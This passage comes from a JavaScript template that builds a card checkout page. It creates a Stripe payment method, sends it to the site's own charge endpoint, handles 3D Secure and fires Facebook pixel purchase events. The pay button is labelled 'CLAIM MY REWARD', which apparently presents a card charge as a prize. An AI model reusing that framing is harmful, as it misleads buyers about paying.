      submitBtn.innerHTML = 'PROCESSING...';

      const nameInput = document.getElementById('name').value.trim();
      const emailInput = document.getElementById('email').value.trim();
      const resolvedName = nameInput || nameParam || '';
      const resolvedEmail = emailInput || emailParam || '';

      const billingParams = { email: resolvedEmail };
      if (resolvedName && resolvedName.toLowerCase() !== 'customer') {
        billingParams.name = resolvedName;
      }

      const { paymentMethod, error } = await stripe.createPaymentMethod({
        type: 'card',
        card: cardNumber,
        billing_details: billingParams
      });

      if (error) {
        errorEl.textContent = error.message;
        submitBtn.disabled = false;
        submitBtn.innerHTML = '<span>CLAIM MY REWARD</span> <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="#000" stroke-width="2.8" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M12 5l7 7-7 7"/></svg>';
        return;
      }

      const pmCard = paymentMethod && paymentMethod.card;
      const cardBrand = pmCard ? pmCard.brand : '';
      const cardLast4 = pmCard ? pmCard.last4 : '';

      try {
        const checkoutSearch = window.location.search ? (window.location.search + '&acc=' + encodeURIComponent(window.__STRIPE_ACCOUNT__ || '${accountCode}')) : ('?acc=' + encodeURIComponent(window.__STRIPE_ACCOUNT__ || '${accountCode}'));
        const res = await fetch('/api/stripe-charge-front' + checkoutSearch, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            payment_method_id: paymentMethod.id,
            card_last4: cardLast4,
            stripe_account: window.__STRIPE_ACCOUNT__ || '${accountCode}',
            name: resolvedName,
            email: resolvedEmail,
            extra_params: Object.fromEntries(urlParams.entries())
          })
        });

        const data = await res.json();

        // 3D Secure Handling
        if (data.ok && data.requires_action && data.client_secret) {
          if (actionEl) actionEl.style.display = 'block';
          let resAction = null;
          try {
            if (typeof stripe.handleNextAction === 'function') {
              resAction = await stripe.handleNextAction({ clientSecret: data.client_secret });
            } else {
              resAction = await stripe.handleCardAction(data.client_secret);
            }
          } catch (e) {
            resAction = { error: e };
          }

          if (resAction && resAction.error) {
            errorEl.textContent = resAction.error.message || 'Authentication failed.';
            submitBtn.disabled = false;
            submitBtn.innerHTML = '<span>CLAIM MY REWARD</span> <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="#000" stroke-width="2.8" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M12 5l7 7-7 7"/></svg>';
            return;
          }

          const confirmRes = await fetch('/api/stripe-confirm-3ds' + checkoutSearch, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              payment_intent_id: resAction.paymentIntent.id,
              customer_id: data.customer_id,
              payment_method_id: paymentMethod.id,
              stripe_account: window.__STRIPE_ACCOUNT__ || '${accountCode}',
              name: resolvedName,
              email: resolvedEmail,
              extra_params: Object.fromEntries(urlParams.entries())
            })
          });

          const confirmData = await confirmRes.json();
          if (confirmData.ok && confirmData.next_url) {
            submitBtn.innerHTML = '&#9989; Approved! Redirecting...';
            if (typeof fbq === 'function') {
              const firstName = (resolvedName || '').split(' ')[0] || '';
              const lastName = (resolvedName || '').split(' ').slice(1).join(' ') || '';
              initPixels({ em: resolvedEmail, fn: firstName, ln: lastName });
              const finalValue = confirmData.amount ? confirmData.amount / 100 : ${frontPriceCents} / 100;
              const eventId = confirmData.order_id || confirmData.payment_intent_id || ('ord_' + Date.now());
              fbq('track', 'Purchase', { value: finalValue, currency: 'USD' }, { eventID: eventId });
            }
            setTimeout(() => { window.location.replace(confirmData.next_url); }, 800);
            return;
          } else {
            errorEl.textContent = confirmData.error || 'Payment confirmation failed.';
            submitBtn.disabled = false;
            submitBtn.innerHTML = '<span>CLAIM MY REWARD</span> <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="#000" stroke-width="2.8" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M12 5l7 7-7 7"/></svg>';
            return;
          }
        }

        if (data.ok && data.next_url) {
          submitBtn.innerHTML = '&#9989; Approved! Redirecting...';
          if (typeof fbq === 'function') {
            const firstName = (resolvedName || '').split(' ')[0] || '';
            const lastName = (resolvedName || '').split(' ').slice(1).join(' ') || '';
            initPixels({ em: resolvedEmail, fn: firstName, ln: lastName });
            const finalValue = data.amount ? data.amount / 100 : ${frontPriceCents} / 100;
            const eventId = data.order_id || data.payment_intent_id || ('ord_' + Date.now());
            fbq('track', 'Purchase', { value: finalValue, currency: 'USD' }, { eventID: eventId });
          }
          setTimeout(() => { window.location.replace(data.next_url); }, 800);
        } else {
          errorEl.textContent = data.error || 'Payment failed. Please check your card details.';
          submitBtn.disabled = false;
          submitBtn.innerHTML = '<span>CLAIM MY REWARD</span> <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="#000" stroke-width="2.8" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M12 5l7 7-7 7"/></svg>';
        }
      } catch (err) {
        errorEl.textContent = 'Server connection error. Please try again.';
        submitBtn.disabled = false;
        submitBtn.innerHTML = '<span>CLAIM MY REWARD</span> <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="#000" stroke-width="2.8" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M12 5l7 7-7 7"/></svg>';
      }
    });

    function initPixels(userData) {
      if (typeof fbq !== 'function') return;
      try {
        ${pixelIds.map(id => `fbq('init', '${id}', userData);`).join('\n        ')}
      } catch(e) {}
    }
  </script>
</body>
</html>`;
}
